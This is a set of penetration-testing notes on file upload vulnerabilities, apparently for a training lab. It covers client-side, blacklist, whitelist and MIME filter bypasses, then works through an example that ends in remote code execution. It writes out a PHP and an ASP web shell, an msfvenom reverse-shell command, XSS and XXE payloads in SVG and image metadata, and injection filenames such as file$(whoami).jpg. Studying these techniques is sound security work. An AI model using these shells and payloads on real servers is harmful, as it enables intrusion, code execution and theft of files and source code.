# File Upload

## File Upload

### Identifying web framework

We need to know which backend langage the server is running in order to know which file type we should upload

We can visit the `index.<EXT>` file and see which works

We can use the extension

### Shells

```shellscript
# Interesting PHP web shell => provides a terminal like page
https://github.com/Arrexel/phpbash

# PHP web shell
<?php system($_REQUEST['cmd']); ?>
http://SERVER_IP:PORT/uploads/shell.php?cmd=id

# PHP reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

# ASP web shell
<% eval request('cmd') %>
```

### Bypassing filters

#### Client-side validation

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.

All validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file

**Back-end request modification**

If we can only upload image files, we can intercept the upload request with burp

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F3utY8k1DWgV5ZcKcOTCJ%2Fimage.png?alt=media&#x26;token=22e148e5-4187-4239-99eb-909f8dfc9dca" alt=""><figcaption></figcaption></figure>

And then replace the file name for a php one, and also the content for a web shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F3RLW0mDEWJBQfC65aOAA%2Fimage.png?alt=media&#x26;token=be99d813-1325-4deb-82c5-ffda9950cf0b" alt=""><figcaption></figcaption></figure>

**Disabling Front-end Validation**

If we find the function responsible for the check, in this case `checkFile(this)`, we can just delete it in the dev tools, leaving it like `onchange=””`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fz6srESSx7mmku4Wl6E7l%2Fimage.png?alt=media&#x26;token=cea65912-6daa-4a4d-b8d9-62f8a79543b5" alt=""><figcaption></figcaption></figure>

We should then be able to upload our image. When uploaded, go to dev tools, and find the path to the image/shell to access it

#### Blacklist filters

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst" %}

Load the file content in the payloads tab under payload options. We should also disable the url encoding filter to avoir encoding the (.)

**When we fuzz for allowed extensions, change the content to a PHP 'hello world' script. Then, when you you check the uploaded file, you would know whether it can execute PHP code !!!**

`<?php echo(”Hello World”); ?>`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FsBJFAU14UHLBRX0EAnfz%2Fimage.png?alt=media&#x26;token=df7f8281-242c-4334-8a93-29d863662d85" alt=""><figcaption></figcaption></figure>

When we find an authorized extension, repeat the same actions

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FRLth56K8hm5BtCrgxXbt%2Fimage.png?alt=media&#x26;token=add0da04-a909-40a0-8b22-2d11b38e067b" alt=""><figcaption></figcaption></figure>

#### Whitelist filters

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst" %}

**Double extension**

Due to poor whitelist (regex), we could bypass it with double extensions. The wordlist below contains double extension payloads

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FTaeYKBNARbobQ2H59EzA%2Fimage.png?alt=media&#x26;token=c56f0a83-a74e-4872-8e84-7bc3ae9d2205" alt=""><figcaption></figcaption></figure>

If double extension is possible

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fc3ESwO7tavpOiLCELaHx%2Fimage.png?alt=media&#x26;token=200105d7-bf51-4776-b7a2-5a7d6507b215" alt=""><figcaption></figcaption></figure>

**Reverse double extension**

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst" %}

In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FLngm8YfY3cKFrHteNFMs%2Fimage.png?alt=media&#x26;token=86ab2a60-6a73-42a2-b1b8-0881e97c18d5" alt=""><figcaption></figcaption></figure>

If all php extensions are not blacklisted. Replace php by the allowed php extension

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F4rcsXg8FbegcIV05GTsF%2Fimage.png?alt=media&#x26;token=039744a9-00df-4f71-bd6c-f032e5ff8c9b" alt=""><figcaption></figcaption></figure>

**Character injection**

`Character Injection` : we can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.

The following are some of the characters we may try injecting:

* `%20`
* `%0a`
* `%00`
* `%0d0a`
* `/`
* `.\\`
* `.`
* `…`
* `:`

```shellscript
# Bash script to generate all permutations of the file name and the above characters
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar'  '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

# Then run burp intruder to fuzz the allowed ones
```

#### Type filters

While extension filters may accept several extensions, content filters usually specify a single category (e.g., images, videos, documents), which is why they do not typically use blacklists or whitelists\
There are two common methods for validating the file content: `Content-Type` Header or `File Content`

If we change the file name to `shell.jpg.phtml` or `shell.php.jpg`, or even if we use `shell.jpg` with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the `Content-Type Header` or the `File Content`

**Content type header**

Fuzz for a successful `Content-Type` header value

{% embed url="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt" %}

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F3hyrS6EDjzyGBWl0UtuF%2Fimage.png?alt=media&#x26;token=615d232a-9315-4443-bb94-ca4dece820c2" alt=""><figcaption></figcaption></figure>

A file upload HTTP request has two `Content-Type` headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's `Content-Type` header, but in some cases the request will only contain the main `Content-Type` header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main `Content-Type` header.

**MIME type**

MIME-Type => Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure. This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

**Tip:** Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FqZg05tgNnyr1zntT8axI%2Fimage.png?alt=media&#x26;token=a1591b74-c8c4-4801-9868-8022e3f5df2b" alt=""><figcaption></figcaption></figure>

We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

### Limited file uploads

While file upload forms with weak filters can be exploited to upload arbitrary files, some upload forms have secure filters that may not be exploitable with the techniques we discussed. However, even if we are dealing with a limited (i.e., non-arbitrary) file upload form, which only allows us to upload specific file types, we may still be able to perform some attacks on the web application.

Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server

#### XSS

Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them.

The most basic example is when a web application allows us to upload `HTML` files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.

Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows

```shellscript
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

Finally, XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to an svg file

```shellscript
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.

#### XXE

Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (`/etc/passwd`)

```shellscript
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source. Similarly, if the web application allows the upload of `XML` documents, then the same payload can carry the same attack when the XML data is displayed on the web application.

While reading systems files like `/etc/passwd` can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to `locate the upload directory, identify allowed extensions, or find the file naming scheme`, which may become handy for further exploitation.

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image

```shellscript
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### Other uploads attacks

#### Injections in file names

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.

For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution

Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

#### Upload Directory Disclosure

In some file upload forms, like a feedback form or a submission form, we may not have access to the link of our uploaded file and may not know the uploads directory. In such cases, we may utilize fuzzing to look for the uploads directory or even use other vulnerabilities (e.g., LFI/XXE) to find where the uploaded files are by reading the web applications source code, as we saw in the previous section

Another method we can use to disclose the uploads directory is through forcing error messages, as they often reveal helpful information for further exploitation. One attack we can use to cause such errors is uploading a file with a name that already exists or sending two identical requests simultaneously. This may lead the web server to show an error that it could not write the file, which may disclose the uploads directory. We may also try uploading a file with an overly long name (e.g., 5,000 characters). If the web application does not handle this correctly, it may also error out and disclose the upload directory

### Example

We have a contact for with the ability to upload images (the green button sends a POST request)

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FnwbJ9MDWt89hUUiWzk6v%2Fimage.png?alt=media&#x26;token=7a1f9498-0dbd-49b1-a90a-004ea6122b04" alt=""><figcaption></figcaption></figure>

We have client side validation only allowing us to upload images

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F7T4euTjoMORKvjKxXGzb%2Fimage.png?alt=media&#x26;token=7a74b088-badc-4905-95d6-eb9318442484" alt=""><figcaption></figcaption></figure>

We upload a real image and catch the request with burp. We try to change the extension manually, but we get an error `Extension not allowed`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQlXXAmyYaL78SOyNXgaS%2Fimage.png?alt=media&#x26;token=c653eafc-470d-4694-bed6-e58ba3a4e620" alt=""><figcaption></figcaption></figure>

We will now fuzz for allowed extensions. Don't forget to un-check characters URL encoding

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FUDTICpKsKmDzo5gXbcBQ%2Fimage.png?alt=media&#x26;token=5c78c86a-03ff-4bf4-86a1-0a0807f7d8c2" alt=""><figcaption></figcaption></figure>

Filtering by size, we discover some allowed PHP extensions. In our case, we will use .phar. We can see that the error message is not the same anymore

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FwfH12m2MVVyPAU4CwFSz%2Fimage.png?alt=media&#x26;token=3e532776-33ec-4465-a488-991ce4d5c0f9" alt=""><figcaption></figcaption></figure>

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FM7oMl8iM2iZb8r3eC82x%2Fimage.png?alt=media&#x26;token=c244b8dc-1eff-401a-8867-00e66e8e5f61" alt=""><figcaption></figcaption></figure>

We will now try to make the server think our phar file is an image by appending a jpg extension. We don't see an error anymore and get the b64 of our image

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FnR9VFPPIwHaVeOop5JC6%2Fimage.png?alt=media&#x26;token=676c35c8-afa4-47c8-9d3f-dca778e57141" alt=""><figcaption></figcaption></figure>

We don't know where the images are uploaded, so we will use an XXE to read the source code. We will inject our payload instead of the image data and change the file extension to svg, which is accepted. Here we get the b64 of the source code for upload.php

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FhosBw0KZfFZzGF6GPxEV%2Fimage.png?alt=media&#x26;token=ba7a7f35-8b03-4fc5-a190-0b03d9c73e34" alt=""><figcaption></figcaption></figure>

We decode the source code and get the following. We get the uploads directory, as well as the naming convention used before saving the file

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

We will now come back to our image exploitation with the phar extension. We will inject our PHP code, replacing the image data. We need to be careful not to overwrite the magic bytes representing the jpg file, or we would get an error

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F8aFhXrjJelUWoinO9vip%2Fimage.png?alt=media&#x26;token=32ee54f0-54e5-4b66-a653-21f7b2274d29" alt=""><figcaption></figcaption></figure>

Now that our payload has been uploaded, we can access it and confirm RCE

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FX3ZVowxecNZpJJOTcs4T%2Fimage.png?alt=media&#x26;token=5d9ed2f5-eda0-4f79-b2fb-69b9d828a015" alt=""><figcaption></figcaption></figure>
